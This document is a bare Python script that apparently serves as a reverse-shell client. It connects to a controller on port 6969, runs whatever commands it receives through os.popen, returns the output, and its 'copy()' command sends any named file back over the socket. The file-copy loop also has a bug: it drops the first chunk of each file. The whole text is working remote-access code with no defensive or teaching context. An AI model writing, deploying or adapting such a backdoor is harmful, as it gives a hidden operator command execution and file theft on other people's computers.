import socket, os

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = socket.gethostname()
port = 6969

server.connect((host, port))

msg = server.recv(1024)
print(msg.decode('utf-8') + "\n")

emptyResponseCommands = ["cls", "exit"]

while True:
    cwd = os.getcwd().encode("utf-8")
    server.send(cwd)

    command = server.recv(1024).decode("utf-8")

    if command == "quit()":
        server.close()
        print("\nConnection Terminated.")
        break
    else:
        if command == "cd .." or command == "cd..":
            curDir = cwd.decode("utf-8").split("\\")
            os.chdir("\\".join(curDir[:len(curDir)-1]))
            server.send(b"COMMAND EXCPETION.")
        elif "cd" in command and (".." not in command) and len(command) > 2:
            newDir = command.split(" ")[1]
            newDir = cwd.decode("utf-8") + "\\" + newDir
            os.chdir(newDir)
            server.send(b"COMMAND EXCPETION.")
        elif command == "RESPOND NULL":
            continue
        elif "copy()" in command:
            fileName = command.split(".copy()")
            fileAlias = open(fileName[0], "rb")
            binaryData = fileAlias.read(1024)
            while binaryData:
                binaryData = fileAlias.read(1024)
                server.send(binaryData)
            server.send(b"EOF")
        elif command in emptyResponseCommands:
            server.send(b"This command is currently not supported.\n")
        else:
            output = os.popen(command).read().encode("utf-8")

            if output.decode("utf-8") != "":
                server.send(output)
            else:
                server.send(b"COMMAND EXCPETION.")
